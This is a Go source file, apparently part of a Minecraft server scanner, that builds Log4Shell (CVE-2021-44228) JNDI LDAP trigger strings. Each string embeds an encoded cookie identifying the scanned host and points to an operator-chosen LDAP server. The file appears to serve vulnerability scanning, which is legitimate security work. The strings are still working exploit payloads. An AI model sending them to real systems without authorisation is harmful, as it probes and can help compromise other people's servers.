package hello

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/sch8ill/minescan/proto/cookie"
)

// ldapBuilder creates log4shell triggers.
type ldapBuilder struct {
	cookieOven  cookie.Log4ShellOven
	ldapAddress string
	ldapPath    string
}

// NewLDAPBuilder creates a new ldapBuilder for creating triggers which are being exectued when being parsed
// by versions of log4j vulnerable to the log4shell exploit (CVE-2021-44228...).
func NewLDAPBuilder(cookieSeed int, ldapAddress string, ldapPath string) ldapBuilder {
	return ldapBuilder{
		cookieOven:  cookie.NewLog4ShellOven(cookieSeed),
		ldapAddress: ldapAddress,
		ldapPath:    ldapPath,
	}
}

// trigger creates a string triggering the log4shell exploit with cookie data as the LDAP path.
func (h ldapBuilder) trigger(ip net.IP, port uint16, info uint16, timestamp time.Time) string {
	// some systems cannot handle "="
	cookie := strings.ReplaceAll(h.cookieOven.Create(ip, port, info, timestamp), "=", "")
	return fmt.Sprintf("${jndi:ldap://%s/%s/%s}", h.ldapAddress, cookie, h.ldapPath)
}
